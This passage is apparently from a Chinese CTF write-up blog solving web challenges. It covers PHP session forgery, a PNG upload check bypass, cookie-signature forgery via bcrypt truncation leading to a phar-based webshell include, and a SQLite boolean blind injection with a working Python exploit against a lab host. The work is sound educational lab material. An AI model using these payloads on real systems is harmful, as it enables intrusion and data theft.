TEMP_DIR . <span class="string">'/'</span> . $filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($type === <span class="string">'tar'</span>) &#123;</span><br><span class="line">  $archive = <span class="keyword">new</span> PharData($path);</span><br><span class="line">  $archive-&gt;startBuffering();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// use zip as default</span></span><br><span class="line">  $archive = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($index = <span class="number">0</span>; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">  $note = $notes[$index];</span><br><span class="line">  $title = $note[<span class="string">'title'</span>];</span><br><span class="line">  $title = preg_replace(<span class="string">'/[^!-~]/'</span>, <span class="string">'-'</span>, $title);</span><br><span class="line">  $title = preg_replace(<span class="string">'#[/\\?*.]#'</span>, <span class="string">'-'</span>, $title); <span class="comment">// delete suspicious characters</span></span><br><span class="line">  $archive-&gt;addFromString(<span class="string">"&#123;$index&#125;_&#123;$title&#125;.json"</span>, json_encode($note));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($type === <span class="string">'tar'</span>) &#123;</span><br><span class="line">  $archive-&gt;stopBuffering();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $archive-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $filename . <span class="string">'";'</span>);</span><br><span class="line">header(<span class="string">'Content-Length: '</span> . filesize($path));</span><br><span class="line">header(<span class="string">'Content-Type: application/zip'</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>export.php的作用是将我们add的note导出成zip或者rar,而导出的数据存放的位置就是$path</p>
<p><img src="/.com//6.png" alt="1573796118066"></p>
<p>其中TEMP_DIR</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'TEMP_DIR'</span>, <span class="string">'/var/www/tmp'</span>);</span><br></pre></td></tr></table></figure>

<p>说明<strong>session文件和notes文件存放的位置是一样的</strong></p>
<p>那我们可以把notes文件伪造成session文件,伪造session文件的方法如下,看到代码:</p>
<p><img src="/.com//7.png" alt="1573796309405"></p>
<p>username写成:sess_</p>
<p>$type我们写成一个’.’就好了</p>
<p>那这样子$filename就是sess_-0123456789abcdef..</p>
<p>经过str_replace(),就变成了sess_-0123456789abcdef</p>
<p>那么另一个问题是如何把内容写入session文件,看到代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($type === <span class="string">'tar'</span>) &#123;</span><br><span class="line">  $archive = <span class="keyword">new</span> PharData($path);</span><br><span class="line">  $archive-&gt;startBuffering();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// use zip as default</span></span><br><span class="line">  $archive = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($index = <span class="number">0</span>; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">  $note = $notes[$index];</span><br><span class="line">  $title = $note[<span class="string">'title'</span>];</span><br><span class="line">  $title = preg_replace(<span class="string">'/[^!-~]/'</span>, <span class="string">'-'</span>, $title);</span><br><span class="line">  $title = preg_replace(<span class="string">'#[/\\?*.]#'</span>, <span class="string">'-'</span>, $title); <span class="comment">// delete suspicious characters</span></span><br><span class="line">  $archive-&gt;addFromString(<span class="string">"&#123;$index&#125;_&#123;$title&#125;.json"</span>, json_encode($note));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中</p>
<p><img src="/.com//8.png" alt="1573797062110"></p>
<p>ZipArchive::open()中的$path可以指定为任何文件,只要后面的参数正确,我们就能改写该文件.</p>
<p>然后我们就能在title处把文件写进去</p>
<p>然后我们要写什么文件呢?</p>
<p>php 默认的 session 反序列化方式是<strong>php</strong> ，其存储方式为<strong>键名+竖线+经过serialize函数序列处理的值</strong> ，</p>
<p>例如:name|s:6:”cookie”;</p>
<p>这就可以伪造 admin了.</p>
<p><img src="/.com//9.png" alt="1573797937267"></p>
<p><img src="/.com//10.png" alt="1573797923249"></p>
<p>获得一个filename,这个就是sessionid</p>
<p><img src="/.com//11.png" alt="1573797983987"></p>
<p>访问获得flag</p>
<h2 id="3-Avatar-Uploader-1"><a href="#3-Avatar-Uploader-1" class="headerlink" title="(3)Avatar Uploader 1"></a>(3)Avatar Uploader 1</h2><p>打开靶机,任意用户名登录后</p>
<p><img src="/.com//12.png" alt></p>
<p>要求上传一个PNG图片,大小小于256KB,像素小于256px*256px</p>
<p>当我们上传一个符合要求的png图片,使用burp抓包,修改后缀名还有Content-type,后仍然是可以上传成功的</p>
<p>题目提供源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">'image/png'</span>])) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded file is not PNG format.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded image is too large.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  error(<span class="string">'What happened...? OK, the flag for part 1 is: &lt;code&gt;'</span> . getenv(<span class="string">'FLAG1'</span>) . <span class="string">'&lt;/code&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码想要获得flag的方法就是上传的文件在finfo_file()的检测下是png,而在getimagesize()的判断下不是png.</p>
<p>利用finfo_file()的一个特性:<strong>finfo_file()函数可以识别png图片十六进制的第一行,然而getimagesize()不可以</strong></p>
<p><img src="/.com//13.png" alt></p>
<p>所以上传这个文件就能获得flag</p>
<h2 id="4-Avatar-Uploader-2"><a href="#4-Avatar-Uploader-2" class="headerlink" title="(4)Avatar Uploader 2"></a>(4)Avatar Uploader 2</h2><p>代码审计题</p>
<p>这题考察的是LFI</p>
<h3 id="漏洞产生点"><a href="#漏洞产生点" class="headerlink" title="漏洞产生点"></a>漏洞产生点</h3><p>首先审计代码,在index.php中看到</p>
<p><img src="/.com//4.png" alt="1575981418056"></p>
<p>怀疑存在文件包含漏洞.这个点先放着</p>
<p>跟进session.php</p>
<p>这是一个session类,关于session的所有操作都在这儿产生.</p>
<p>那么先看到__construct()</p>
<p><img src="/.com//14.png" alt="1575981664370"></p>
<p>我们在burp抓包的时候可以看到这里的cookie</p>
<p><img src="/.com//15.png" alt="1575981800536"></p>
<p>可以看到该构造方法的作用在于将传入的session根据”.”分割成$data和$signature.</p>
<p>$data和$signature经过urlsafe_base64_decode(),再经过verify()认证.认证成功后,就将其进行json_decode.至此可以获得data数据.</p>
<p>分析get()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $defaultValue = null)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isset($key)) &#123;</span><br><span class="line">    <span class="keyword">return</span> $defaultValue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进isset()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> array_key_exists($key, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说通过get()方法,在Index.php上实施LFI.</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>目标很明确,我们需要自写session.</p>
<p>代码中是通过save()产生session的</p>
<p><img src="/.com//16.png" alt="1575983412359"></p>
<p>将data数据进行json_encode,其结果为$json,然后将$json进行urlsafe_base64_encode(),并和$json经过sign()的签名加密后的base64_encode()的结果进行拼接,作为session.</p>
<p>跟进sign()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sign</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> password_hash(<span class="keyword">$this</span>-&gt;secret . $string, PASSWORD_BCRYPT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中password_hash存在截断问题</p>
<p><img src="/.com//17.png" alt="1575983904408"></p>
<p>这里对应在__construct()中调用的verify()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($string, $signature)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> password_verify(<span class="keyword">$this</span>-&gt;secret . $string, $signature);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明$this-&gt;secret . $string超过72个字符后,我们可以随便写,产生的签名都是相同的.由此绕过verify()</p>
<p>所以我们只要找到一个点触发<strong>save</strong>函数，并且设置的cookie的data字段超过72个字符就行了.</p>
<h3 id="寻找触发点"><a href="#寻找触发点" class="headerlink" title="寻找触发点"></a>寻找触发点</h3><p>在upload.php中的error()</p>
<p><img src="/.com//18.png" alt="1575984685646"></p>
<p>可触发save()方法.</p>
<h3 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h3><p>访问upload.php,这时,我们不传文件,便会触发一个错误信息,产生一个包含错误信息的cookie:</p>
<p><img src="/.com//19.png" alt="1576026517151"></p>
<p>cookie进行解码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"cookie"</span>,<span class="string">"avatar"</span>:<span class="string">"3f4e1410.png"</span>,<span class="string">"flash"</span>:&#123;<span class="string">"type"</span>:<span class="string">"error"</span>,<span class="string">"message"</span>:<span class="string">"No file was uploaded."</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>很明显已经超过了72个字符.</p>
<p>在index.php中触发点需要包含css文件,使用<strong>phar协议</strong>,在phar中复合一个带有马的exp.css,然后改变theme字段为:<strong>phar://uploads/xxxxxx.png/exp</strong>,成功包含后就可以实现rce了.</p>
<p>生成phar</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                 <span class="meta">?&gt;</span><span class="string">');</span></span><br><span class="line"><span class="string">$phar-&gt;setStub($png_header . '</span><span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>(); ?&gt;');</span></span><br><span class="line"><span class="comment">$phar-&gt;stopBuffering();</span></span><br></pre></td></tr></table></figure>

<p>登录账号上传phar文件:</p>
<p><img src="/.com//20.png" alt="1576026985111"></p>
<p>生成exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlsafe_base64_encode</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> rtrim(str_replace([<span class="string">'+'</span>, <span class="string">'/'</span>], [<span class="string">'-'</span>, <span class="string">'_'</span>], base64_encode($data)), <span class="string">'='</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlsafe_base64_decode</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_decode(str_replace([<span class="string">'-'</span>, <span class="string">'_'</span>], [<span class="string">'+'</span>, <span class="string">'/'</span>], $data) . str_repeat(<span class="string">'='</span>, <span class="number">3</span> - (<span class="number">3</span> + strlen($data)) % <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cookie = <span class="string">"eyJuYW1lIjoiY29va2llIiwiYXZhdGFyIjoiM2Y0ZTE0MTAucG5nIiwiZmxhc2giOnsidHlwZSI6ImVycm9yIiwibWVzc2FnZSI6Ik5vIGZpbGUgd2FzIHVwbG9hZGVkLiJ9fQ.JDJ5JDEwJEJhVWs3bEg0Mk9UOWFjN3AxR01IQnVMMTZycnE0cTJ3ZjdRRXlCTXVMYUVwUUNBQWFwMy5T"</span>;</span><br><span class="line"><span class="keyword">list</span>($data, $signature) = explode(<span class="string">'.'</span>, $cookie);</span><br><span class="line">$data = urlsafe_base64_decode($data);</span><br><span class="line">var_dump($data);</span><br><span class="line">$json = json_decode($data,<span class="keyword">true</span>);</span><br><span class="line">var_dump($json[<span class="string">'avatar'</span>]);</span><br><span class="line">$avatar = $json[<span class="string">'avatar'</span>];</span><br><span class="line">$data = str_replace(<span class="string">'&#125;&#125;'</span>,<span class="string">'&#125;,"theme":"phar://uploads/'</span>.$avatar.<span class="string">'/exp"&#125;'</span>,$data);</span><br><span class="line">var_dump($data);</span><br><span class="line">$data = urlsafe_base64_encode($data);</span><br><span class="line">$cookie = $data . <span class="string">'.'</span>. $signature;</span><br><span class="line">var_dump($cookie);</span><br></pre></td></tr></table></figure>

<p><img src="/.com//22.png" alt="1576027456782"></p>
<p>然后用此exp做rce….</p>
<p><img src="/.com//21.png" alt="1576027364276"></p>
<p>读取根目录下的的flag文件</p>
<p><img src="/.com//23.png" alt="1576027672596"></p>
<h2 id="5-Sqlite-Voting"><a href="#5-Sqlite-Voting" class="headerlink" title="(5)Sqlite Voting"></a>(5)Sqlite Voting</h2><p>提供源码：</p>
<p>vote.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">'\s'</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">'blob'</span>, <span class="string">'load_extension'</span>, <span class="string">'char'</span>, <span class="string">'unicode'</span>,</span><br><span class="line">    <span class="string">'(in|sub)str'</span>, <span class="string">'[lr]trim'</span>, <span class="string">'like'</span>, <span class="string">'glob'</span>, <span class="string">'match'</span>, <span class="string">'regexp'</span>,</span><br><span class="line">    <span class="string">'in'</span>, <span class="string">'limit'</span>, <span class="string">'order'</span>, <span class="string">'union'</span>, <span class="string">'join'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'You must specify vote id'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'Vote id contains dangerous chars'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:../db/vote.db'</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">'message'</span> =&gt; <span class="string">'Thank you for your vote! The result will be published after the CTF finished.'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p>从这段源码可以得到连两个信息：</p>
<p>（1）它过滤掉的函数以及一些注入时需要的关键字符，包括空格。</p>
<p>（2）向数据库更新id数据时，更新成功和更新失败返回的内容是不一样的。说明这里存在<strong>布尔盲注</strong>。</p>
<p>schema.sql:</p>
<figure class="highlight sql"><figcaption><span>lite</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`vote`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`vote`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">INTEGER</span> PRIMARY <span class="keyword">KEY</span> AUTOINCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`count`</span> <span class="built_in">INTEGER</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`vote`</span> (<span class="string">`name`</span>, <span class="string">`count`</span>) <span class="keyword">VALUES</span></span><br><span class="line">  (<span class="string">'dog'</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">'cat'</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">'zebra'</span>, <span class="number">0</span>),</span><br><span class="line">  (<span class="string">'koala'</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`flag`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`flag`</span> (</span><br><span class="line">  <span class="string">`flag`</span> <span class="built_in">TEXT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`flag`</span> <span class="keyword">VALUES</span> (<span class="string">'HarekazeCTF&#123;&lt;redacted&gt;&#125;'</span>);</span><br></pre></td></tr></table></figure>

<p>从这里可以提取两个信息：</p>
<p>（1）数据库中有两个数据表，其中一个是vote，一个是flag</p>
<p>（2）flag在flag表中，我们获取flag，通过查询语句：<strong>select(flag)from(flag)</strong></p>
<h3 id="寻找报错触发点"><a href="#寻找报错触发点" class="headerlink" title="寻找报错触发点"></a>寻找报错触发点</h3><p>上文说到的布尔盲注，这里是使用到了<strong>数据库报错，导致的数据更新失败，使得我们可以由此作为数据库判断依据</strong>的思路。那么如何使数据库报错？</p>
<p>这里使用的数据库是sqlite3，在sqlite中有一个<strong>abs()函数</strong>，这个函数存在整形溢出报错的问题，如下图所示：</p>
<p><img src="/.com//1.png" alt></p>
<p>只要出现溢出报错，那么就能触发这个布尔盲注。</p>
<h3 id="获取flag的长度"><a href="#获取flag的长度" class="headerlink" title="获取flag的长度"></a>获取flag的长度</h3><p>exp1：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://a84c8635-79fe-45a4-8687-64bed6855f24.node3.buuoj.cn/vote.php"</span></span><br><span class="line">length=<span class="number">0</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  payload = <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;n&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">  <span class="comment">#print(payload)</span></span><br><span class="line">  data = &#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">  r = s.post(url=url,data=data)</span><br><span class="line">  <span class="comment">#print(r.text)</span></span><br><span class="line">  <span class="keyword">if</span> <span class="string">'occurred'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        length=length|<span class="number">1</span>&lt;&lt;n</span><br><span class="line">print(<span class="string">"the legnth of flag:"</span>+str(length))</span><br></pre></td></tr></table></figure>

<p>解释一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bin(<span class="number">17</span>)</span><br><span class="line"><span class="string">'0b10001'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">17</span>&amp;<span class="number">1</span>&lt;&lt;<span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">17</span>&amp;<span class="number">1</span>&lt;&lt;<span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">17</span>&amp;<span class="number">1</span>&lt;&lt;<span class="number">2</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">17</span>&amp;<span class="number">1</span>&lt;&lt;<span class="number">3</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">17</span>&amp;<span class="number">1</span>&lt;&lt;<span class="number">4</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">17</span>&amp;<span class="number">1</span>&lt;&lt;<span class="number">5</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>首先，我们知道&amp;运算，做按位与运算，其中<strong>1&lt;&lt;n表示2的n次方</strong>。像例子中写的一样，一个数我们可以通过判断它和1&lt;&lt;n做&amp;运算，查看回显，判断这个数的大小。上面这个数就是<strong>(1&lt;&lt;0)+(1&lt;&lt;4)</strong>，结果是17.</p>
<p>同样的道理来判断<strong>flag的16进制值的长度</strong>，payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(case(length(hex((select(flag)<span class="keyword">from</span>(flag))))&amp;&#123;<span class="number">1</span>&lt;&lt;n&#125;)when(<span class="number">0</span>)then(<span class="number">0</span>)<span class="keyword">else</span>(<span class="number">0x8000000000000000</span>)end)</span><br></pre></td></tr></table></figure>

<p>这个payload中巧妙地构造了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abs(case(判断语句)when(<span class="number">0</span>)then(<span class="number">0</span>)<span class="keyword">else</span>(<span class="number">0x8000000000000000</span>)end)</span><br></pre></td></tr></table></figure>

<p>在这个exp中，对于其判断语句中的查询结果为0，则返回0。如果不为0，则返回abs(0x8000000000000000)，这时就会产生整形溢出。当出现溢出的时候，报错，然后返回的1&lt;&lt;n，进行累加。</p>
<p>获得flag的16进制值的长度为84。</p>
<h3 id="盲注flag"><a href="#盲注flag" class="headerlink" title="盲注flag"></a>盲注flag</h3><p>exp2:</p>
